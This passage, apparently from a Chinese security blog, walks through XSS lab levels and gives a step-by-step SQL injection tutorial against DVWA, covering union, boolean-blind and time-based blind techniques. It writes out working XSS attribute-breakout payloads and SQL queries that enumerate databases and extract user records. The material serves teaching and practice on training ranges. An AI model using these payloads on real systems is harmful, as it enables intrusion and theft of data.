src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733235595166-8430cec0-bfdc-4e97-bdd0-e813e88c3477.png"></p><p>(http:&#x2F;&#x2F;)只是为了绕过检测，是一个无效的函数调用，浏览器会忽略它，继续执行 alert(1)</p><h2 id="hidden参数传递数据"><a href="#hidden参数传递数据" class="headerlink" title="hidden参数传递数据"></a>hidden参数传递数据</h2><p>源代码中多了这三行内容</p><p>有三个输入框，但是type为隐藏了</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236318868-6f23a4ed-330c-4735-b9f0-4bc3fd2abb80.png"></p><p>三个参数分别尝试，只有当传参?t_sort&#x3D;1时，代码中才会接收到参数值</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236627652-55c8e27e-b2aa-47cf-b9a8-b88d2e685b4d.png"></p><p>尝试构造payload</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236724144-333e09e0-9aa4-4c47-b275-33893dd8f4d9.png"></p><p>发现会过滤&lt;&gt;</p><p>使用事件触发</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>并将type改为submit，点击按钮</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733236813296-a1ed8e3f-f300-4a27-b0be-298422c454d1.png"></p><h2 id="Referer参数传递数据"><a href="#Referer参数传递数据" class="headerlink" title="Referer参数传递数据"></a>Referer参数传递数据</h2><p>仍然是只有t_sort可以接收到参数</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733237087188-4cb11da5-b1fb-459f-8957-ffe4f84e36f8.png"></p><p>修改type，发现t_ref接收返回值参数（Referer请求头参数）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733237926086-9d472c43-face-47b6-b886-f61ebf34fa9e.png"></p><p>尝试构造Referer的payload</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271267752-8aa0f977-bef4-4d4c-ba5c-05c0be00b3c2.png"></p><p>闭合input标签</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271479210-e2daef1d-3757-4dc0-ab26-6fa8dd248346.png"></p><p>是我们想要的结果，抓包之后再放包，页面出现文本框，触发事件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271426787-c9d13d89-c7cd-494d-b463-3246e314035b.png"></p><h2 id="Ua参数传递数据"><a href="#Ua参数传递数据" class="headerlink" title="Ua参数传递数据"></a>Ua参数传递数据</h2><p>发现代码中变成t_ua，通过User-Agent传递数据</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271593145-321e8eb8-9eb3-402a-9cfb-d02839eec055.png"></p><p>?t_link&#x3D;1&amp;t_history&#x3D;2&amp;t_sort&#x3D;3 看是否能接收数据</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733271843191-638bef76-26ec-4256-a515-c0a92d2f6ba1.png"></p><p>依旧只有t_sort能够接收（这里谁接收都无所谓，因为有ua）</p><p>我们抓包修改ua头内容，构造payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>);<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272056454-3670bf9a-5074-4720-b555-bbf2955af567.png"></p><p>出现文本框，说明构造成功</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272073048-19042248-91d3-4b45-b9d4-62c7b487e594.png"></p><p>再抓包修改，放包，点击文本框，按下键盘，触发事件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272118397-9c9bcddd-0b48-4591-ae87-54cc783ab5ed.png"></p><h2 id="Cookie参数传递数据"><a href="#Cookie参数传递数据" class="headerlink" title="Cookie参数传递数据"></a>Cookie参数传递数据</h2><p>盲猜Cookie，抓包</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272166221-3bc500f3-be5d-4f63-922a-01f542f22fef.png"></p><p>果然，cookie中user的值传递给t_cook变量</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272211918-0c01bbf7-cc4e-4530-befe-5418d31d89a6.png"></p><p>修改cookie值构造payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onkeydown=&quot;</span>alert(<span class="number">1</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272388729-da62b6d6-fd7f-4f59-804e-dbdf710f7eb4.png"></p><p>再抓包修改，放包，点击文本框，按下键盘，触发事件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733272431672-101d967e-9173-4f8d-b8ae-556247e2ee33.png"></p><h2 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif-xss"></a>exif-xss</h2><p>该关的<a href="http://www.exifviewer.org/">http://www.exifviewer.org/</a>网址已经被弃用，无法复现</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&time__1311=eqGhqfxmxAxRhEDlrmq0=GOR3=q7qRH9vpD#toc-12">https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11&amp;time__1311&#x3D;eqGhqfxmxAxRhEDlrmq0%3DGOR3%3Dq7qRH9vpD#toc-12</a></p><h2 id="ng-include"><a href="#ng-include" class="headerlink" title="ng-include"></a>ng-include</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276716069-4521f887-d667-47a8-be47-520cdb717cce.png"></p><h2 id="空格被过滤（-0a绕过）"><a href="#空格被过滤（-0a绕过）" class="headerlink" title="空格被过滤（%0a绕过）"></a>空格被过滤（%0a绕过）</h2><p>?keyword&#x3D;test</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276858320-4f68763a-9dca-40a5-8acb-213706c3e4c6.png"></p><p>test被写入<center>标签中</p><p>尝试闭合</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;/center&gt;&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p>输入的&#x2F;、script被过滤为空</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733276974528-6ad581e6-c680-4679-94da-e04ec4193ddc.png"></p><p>双写、大小写都不能绕过，Unicode也不能绕过</p><p>script、空格和&#x2F;时转译成&amp;nbsp</p><p>用回车的url编码%0a代替空格</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733289710240-a283ecb3-2b31-4d54-a5e7-952af4adfb1b.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;img%<span class="number">0</span>asrc=x%0aonerror=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>center标签不用闭合</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733289754479-0c35757f-a229-4cb0-9c37-d90f6597a456.png"></p><h2 id="embed标签"><a href="#embed标签" class="headerlink" title="embed标签"></a>embed标签</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733289825752-14b5a2e0-baa2-464a-b9fa-f251f0eb47d7.png"></p><p>embed标签已经被弃用，不复现</p><p>level17.php?arg01&#x3D;a&amp;arg02&#x3D;%20onmouseover&#x3D;alert(2)</p><p>后几题都是embed标签</p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/2025/05/27/SQL/"/>
      <url>/2025/05/27/SQL/</url>
      
        <content type="html"><![CDATA[<p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1711986767135-834b7008-7626-4ccf-bc8e-227052e883cd.png"></p><h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>最为经典的单引号判断法</p><p>利用<code>&#39;</code>或<code>&#39;&#39;</code>来判断是否存在漏洞，在参数后面加上单引号，比如<code>http://xxx/abc.php?id=1&#39;</code>，如果页面返回错误，则存在SQL注入<img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718865537767-614e03c9-908c-41e8-a0bb-56587bfe50f1.png" alt="返回的错误信息"></p><p>原因是无论是字符型还是数字型都会因为单引号个数不匹配而报错</p><p>（如果未报错，不代表不存在SQL注入，因为有可能是页面对单引号进行了过滤，这时可以使用判断语句进行注入）</p><h2 id="判断闭合方式："><a href="#判断闭合方式：" class="headerlink" title="判断闭合方式："></a>判断闭合方式：</h2><p>?id&#x3D;1’</p><p>?id&#x3D;1”</p><p>结果一：如果都报错</p><p>判断闭合符为：整形闭合。</p><p>结果二：如果单引号报错，双引号不报错。</p><p>继续尝试</p><p>?id&#x3D;1’ –+</p><p>结果1：无报错</p><p>判断闭合符为：单引号闭合。</p><p>结果2：报错</p><p>判断闭合符可能为：单引号加括号。</p><p>结果三：如果单引号不报错，双引号报错。</p><p>继续尝试</p><p>?id&#x3D;1” –+</p><p>结果1：结果无报错</p><p>判断闭合符为：双引号闭合。</p><p>结果2：报错</p><p>判断闭合符可能为：双引号加括号。</p><h2 id="判断SQL注入的类型"><a href="#判断SQL注入的类型" class="headerlink" title="判断SQL注入的类型"></a>判断SQL注入的类型</h2><p><a href="https://blog.csdn.net/qq_44275213/article/details/118892912">【干货】如何判断 Sql 注入点_判断是否存在sql注入-CSDN博客</a></p><blockquote><p>通常SQL注入数据类型分为两种</p><ol><li>字符型</li><li>数字型</li></ol></blockquote><p>数字型和字符型的区别就是，网站源文件中的sql查询语句有没有单引号，有单引号时，我们需要闭合单引号，为字符型</p><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>用经典的<code>1 and 1=1</code>和<code>1 and 1=2</code>来判断</p><ol><li>Url 地址中输入 <code>http://xxx/abc.php?id= 1 and 1=1</code> 页面依旧运行正常，继续进行下一步</li><li>Url 地址中继续输入 <code>http://xxx/abc.php?id= 1 and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li></ol><blockquote><p>原因：</p><p>当输入 and 1&#x3D;1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; 1 and 1&#x3D;1 没有语法错误且逻辑判断为正确，所以返回正常。</p><p>当输入 and 1&#x3D;2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; 1 and 1&#x3D;2 没有语法错误但是逻辑判断为假，所以返回错误。</p></blockquote><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>用 <code>1&#39; and &#39;1&#39;=&#39;1</code> 和<code>1&#39; and &#39;1&#39;=&#39;2</code>来判断</p><ol><li>Url 地址中输入<code>http://xxx/abc.php?id= 1&#39; and &#39;1&#39;=&#39;1</code>页面运行正常，继续进行下一步。</li><li>Url 地址中继续输入<code>http://xxx/abc.php?id= 1&#39; and &#39;1&#39;=&#39;2</code>页面运行错误，则说明此 Sql 注入为字符型注入。</li></ol><blockquote><p>前者显示，后者不显示，说明单引号起作用了</p><p>1：前者最终查询的是<code>id=&#39;1&#39;并且&#39;1&#39;=&#39;1&#39;</code></p><p>2：后者最终查询的是<code>id=&#39;1&#39;并且&#39;1&#39;=&#39;2&#39;</code>，因为’1’&#x3D;’2’不成立，所以整条语句也不成立，页面返回为空或者错误是由于sql语句不成立导致的</p></blockquote><p>当注入类型为字符型时，牵涉到MySQL的隐式类型转换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;2admin&#x27; ==&gt;2</span><br><span class="line">&#x27;admin&#x27;==&gt;0</span><br><span class="line">&#x27;33admin&#x27;==&gt;33</span><br><span class="line"></span><br><span class="line">//数字+字符-&gt;数字</span><br><span class="line">//字符-&gt;0</span><br><span class="line">//数字-&gt;数字</span><br><span class="line">//就是当我们输入查询的内容为1addsdad,最终进行隐式转换后查询的还是为1</span><br></pre></td></tr></table></figure><p>因此当注入点为字符型时，我们输入数字型的判断语句<code>1 and 1=1</code>和<code>1 and 1=2</code>，都会经过隐式转换为<code>1</code>,因此查询结果相同</p><h2 id="判断表中字段数"><a href="#判断表中字段数" class="headerlink" title="判断表中字段数"></a>判断表中字段数</h2><p>用order by来判断</p><blockquote><p>原理：order by是用来根据指定的列来对结果进行排序，当order by后的数字大于当前的列数时就会报错</p></blockquote><p>当我们使用order by时，如果注入点为字符型，输入<code>1&#39; order by 5</code>，后台查询为<code>select * from &lt;表名&gt; where id = &#39;1&#39; order by 5&#39; </code>此时单引号没有闭合，因此要在<code>order by 数字 </code>后面加上<code>#</code>注释掉多余的<code>&#39;</code></p><p>在Url中#会被自动编码为%23（如果不进行Url编码，那么#无法传到后端数据库中，带入查询时无法起作用）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718871991073-65406349-fb29-4f6a-b83d-62ec7301af34.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718872055793-42c288a4-071b-439e-8fb4-b9c061ad3897.png"></p><h2 id="确定显示位"><a href="#确定显示位" class="headerlink" title="确定显示位"></a>确定显示位</h2><p>显示位：服务端执行SQL语句查询数据库中的内容，客户端将数据展示在页面中，这个展示数据的位置就叫做显示位</p><p>union操作符：用于合并两个或多个select的结果集</p><ol><li>结果集的列名总是等于union中第一个select语句中的列名</li><li>union内的select语句必须拥有相同数量的列，列也必须有相似的数据类型</li><li>每条select语句中列的顺序必须相同</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,...#(列数)</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718873391517-362a6464-af7d-4d3c-8e8b-1382e37e7526.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718874092900-d6d7151d-3d67-4c20-8ac0-85a3f81615e9.png"><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718874179898-687a8e18-6bf0-4235-b83d-6defbb1a32e3.png"></p><blockquote><p>在实战中一般不查询union左边的内容，这是因为程序在展示数据的时候通常只会取结果集的第一行数据，所以只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。所以让union左边查询不到，可以将其 改为负数或者改为比较大的数字。</p></blockquote><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>前端里没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的</p><p>类似于无法说话的人，只能通过点头和摇头回复正确与否</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>在页面中，正确执行了用户构造的sql语句，返回一种页面，如果sql执行错误，返回另一种页面</p><p>true 和 false</p><ul><li><code>count()</code>来判断数量</li><li><code>length()</code>来判断长度</li><li><code>substr()和limit()</code>来判断具体数据</li></ul><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><ol><li>判断是否存在注入</li><li>获取数据库长度</li><li>逐字猜解数据库名</li><li>猜解表名数量</li><li>猜解某个表名长度</li><li>逐字猜解表名</li><li>猜解列名数量</li><li>猜解某个列名长度</li><li>逐字猜解列名</li><li>判断数据数量</li><li>猜解某条数据长度</li><li>逐位猜解数据</li></ol><h3 id="判断是否存在注入-1"><a href="#判断是否存在注入-1" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p>一般使用<code>1 and 1=1</code>、<code>1 and 1=2</code>、<code>1&#39; and &#39;1&#39;=&#39;1</code>、<code>1&#39; and &#39;1&#39;=&#39;2</code>来进行判断</p><p>一般输入时页面会返回两种情况，一种是对应true，一种是对应false</p><p>举例：</p><p>当输入<code>1 and 1=1</code>、<code>1 and 1=2</code>、<code>1&#39; and &#39;1&#39;=&#39;1</code>时，页面都返回“exists“，存在，表示true</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719406739446-f28942bf-01a0-4ee6-961e-f4b6c73cc2ac.png"></p><p>当输入<code>1&#39; and &#39;1&#39;=&#39;2</code>时，页面返回”missing“，不存在，表示false</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719406868047-29f0b94a-a93b-49cf-ae54-f179d418b089.png"></p><p>页面返回两种情况，说明存在注入</p><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><h4 id="获取数据库名长度"><a href="#获取数据库名长度" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h4><p>使用length()函数来判断</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411466517-520af77c-6686-4608-82ef-7334bd0e9f6e.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411513070-81b87fe8-2ed0-4832-9747-896a59974490.png"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411567067-aa2920b5-c2b2-4ae1-ae3b-ca3fef240a34.png"></p><h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>用substr()函数对数据库名进行字符串截取，以次判断每一位上的字母</p><blockquote><p>substr(string,start,length)</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411846868-46b70666-54a0-4ffc-9727-6bd709365923.png"></p><p>修改start的位置，可以得出其他位置的字母，从而得出完整的数据库名</p><p>可以爆破</p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><h4 id="获取表的数量"><a href="#获取表的数量" class="headerlink" title="获取表的数量"></a>获取表的数量</h4><p>使用count()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)=2%23</span><br></pre></td></tr></table></figure><blockquote><p>统计数据表中包含的记录行的总数，或者根据查询结果返回列中包含的数据行\</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719456554986-9dc7c2db-0528-4cb3-9152-42d239ba325c.png" alt="大于1为true，大于2为false"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719456592344-217c3e48-fcd4-4997-89b6-6f9c2970c858.png" alt="再次验证，等于2为true，说明一共两个表"></p><h4 id="获取表名长度"><a href="#获取表名长度" class="headerlink" title="获取表名长度"></a>获取表名长度</h4><p>分别获取两个表的表名长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1))&gt;1%23</span><br><span class="line">两个括号：里面的括号表示里面是一个整体，外面的括号是length函数带的括号（如果只写一个的话，有逗号可能会被认为是两个参数导致函数错误）</span><br><span class="line">用limit限制只输出第一行的内容（也就是第一个表名）</span><br><span class="line">（因为是有两个表，在输出的时候每个表占一行输出，先求第一个表长度只需要第一个表名）</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719457929979-c3cefa23-0b4f-4def-9f4a-be8d625cb181.png" alt="第一个表长度为9"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 1,1))=5%23</span><br><span class="line">将limit的起始位置改为1，步长还为1，能够只输出第二行（第二张表）</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719458053192-33945394-44fa-4b4c-ae20-a3da959bc100.png" alt="第二个表长度为5"></p><h4 id="获取具体表名"><a href="#获取具体表名" class="headerlink" title="获取具体表名"></a>获取具体表名</h4><p>分别获取两个表具体的表名，使用substr()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)=&#x27;g&#x27;%23 </span><br><span class="line">limit表示为第一个表</span><br><span class="line">substr从第一个表的第一个位置截取步长为1（第一个表的第一个字符）</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719458437932-32bf8802-65df-43cd-88e1-8be4c09109fe.png" alt="第一个表的第一个字母为g"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719458630231-7b10a2b6-d59b-4ffa-b777-c32c60680613.png" alt="爆破点为substr的第二个参数（起始位置）和后面的字符"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 1,1),1,1)=&#x27;g&#x27;%23 </span><br><span class="line">第二张表，将limit的第一个参数改为1</span><br><span class="line">爆破点和爆破第一个表相同</span><br></pre></td></tr></table></figure><h3 id="获取字段名（列名）"><a href="#获取字段名（列名）" class="headerlink" title="获取字段名（列名）"></a>获取字段名（列名）</h3><h4 id="获取某个表中有多少列"><a href="#获取某个表中有多少列" class="headerlink" title="获取某个表中有多少列"></a>获取某个表中有多少列</h4><p>分别查看两个表各有多少列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27;)&gt;1%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719460454279-716a4c5b-5ea9-4672-b951-b56ac3ebaaa8.png" alt="guestbook表有三列"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719460687710-67387e60-878c-46fe-9c19-25c85849b932.png" alt="users表有8列"></p><h4 id="获取列名长度"><a href="#获取列名长度" class="headerlink" title="获取列名长度"></a>获取列名长度</h4><p>分别获取两个表的每个列名的长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//length写在外面</span><br><span class="line">?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27; limit 0,1))=10%23</span><br><span class="line">//写在里面</span><br><span class="line">?id=1&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27; limit 0,1)=10%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719461329693-9fa3e13b-eaf8-4589-9250-bfdfd10df8ff.png"></p><p>依次修改limit的第一个参数（从0-2，因为guestbook表有三列）和后面的数字参数，即可得出guestbook表每一列的列名的长度</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719461947591-d83d987a-08a2-48d6-a7b5-fb38c7b1f5f6.png" alt="三列，每列列名长度分别为10，7，4"></p><p>将表名改为users，爆破点和上面一样，将第一个位置增加到8（一共8列）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719462115232-48622449-24b3-43b7-b00e-eb565b05f7c3.png" alt="users表中的8列的列名长度分别为7，10，9，4，8，6，10，12"></p><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><p>分别获取两个表中每一列的具体列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)=&#x27;a&#x27;%23 </span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719463867318-72ee5102-00b8-41c9-8f7c-fae442151144.png"></p><p>依次改变substr函数截取的起始位直到10即可完整得到第一个列名。</p><blockquote><p>爆破点：substr的第二个参数（1-10，guestbook第一个表的第一列列名长度为10）</p><p>后面的字符（a-z和_）</p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719463846411-a1879e49-8602-446a-a42a-03aa91fa01f0.png" alt="第一列为comment_id"></p><p>要获取第二个列名，只需要修改limit的起始位即可。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719463958117-a8de4c85-05c8-4107-b1e4-ed5a0679c3ba.png" alt="将0改为1，表示第二列"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719464053530-18bd00b7-adab-4c3e-a135-d5bd2ff48dd6.png" alt="第二列为comment"></p><p>以此类推</p><p>要获得users表的列名时，只需要更改为users</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719464130060-9ed3417f-9833-4707-9cda-1260883cfbc5.png"></p><p>爆破点跟上面一样</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719464193197-2a249235-bb7a-48fe-a16d-de9d4dd3f1c4.png" alt="users的第一列列名为user_id"></p><h3 id="获取记录"><a href="#获取记录" class="headerlink" title="获取记录"></a>获取记录</h3><p>表中的每一列有多少行数据</p><p>某行数据有多长</p><p>具体是多少</p><h4 id="获取列中有多少行记录"><a href="#获取列中有多少行记录" class="headerlink" title="获取列中有多少行记录"></a>获取列中有多少行记录</h4><p>count</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select count(user) from users)=5%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719473727347-d09fe43f-8d5c-4ea3-8b5f-faa7ff44dfd4.png"></p><h4 id="获取记录长度"><a href="#获取记录长度" class="headerlink" title="获取记录长度"></a>获取记录长度</h4><p>limit</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select length(user) from users limit 0,1)=5%23</span><br><span class="line">或</span><br><span class="line">?id=1&#x27; and length((select user from users limit 0,1))=5%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719473891522-236e5182-f45e-472e-a605-0aa0b76d18e6.png" alt="改变limit的第一个参数（0-4）可以得出五行数据各有多长"></p><h4 id="获取具体数据"><a href="#获取具体数据" class="headerlink" title="获取具体数据"></a>获取具体数据</h4><p>users表中的user列中五行数据中第一行数据长度为5，求出具体数据内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select user from users limit 0,1),1,1)=&#x27;a&#x27;%23</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719474208970-e57f66dc-cfa8-453b-a920-4ed40076c546.png" alt="改变str的第二个参数可以得出该行的所有数据（1-5）"></p><p>改变limit的第一个参数可以改变所要求的行数（0-4）</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>不管用户输入什么，网站都没有正确或者错误的页面回显，利用页面的响应时间来判断sql语句有没有执行</p><h3 id="时间盲注函数"><a href="#时间盲注函数" class="headerlink" title="时间盲注函数"></a>时间盲注函数</h3><p>sleep()</p><p>benchmark(N,exp)（N为次数，exp为执行语句，将一个语句执行很多次从而达到时间盲注效果，N通常很大，比如500000000）</p><h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><ol><li>判断是否存在注入</li><li>获取数据库长度</li><li>逐字猜解数据库名</li><li>猜解表名数量</li><li>猜解某个表名长度</li><li>逐字猜解表名</li><li>猜解列名数量</li><li>猜解某个列名长度</li><li>逐字猜解列名</li><li>判断数据数量</li><li>猜解某条数据长度</li><li>逐位猜解数据</li></ol><h3 id="判断是否存在注入-2"><a href="#判断是否存在注入-2" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p><code>sleep()</code>函数，当使用sleep()函数时，观察页面响应时间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and sleep(3)</span><br><span class="line">1&#x27; and sleep(3)%23</span><br></pre></td></tr></table></figure><p>如果sleep生效，则说明存在sql注入</p><h3 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><h4 id="获取数据库名长度-1"><a href="#获取数据库名长度-1" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h4><p><code>if(expr1,expr2,expr3)</code>第一个条件成立就执行expr2，否则执行expr3（三元表达式）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(database())=8,sleep(3),1)%23</span><br><span class="line">页面延迟，8就为database的长度</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719485844545-cf099b1c-8da1-49ec-a29e-f78955874758.png" 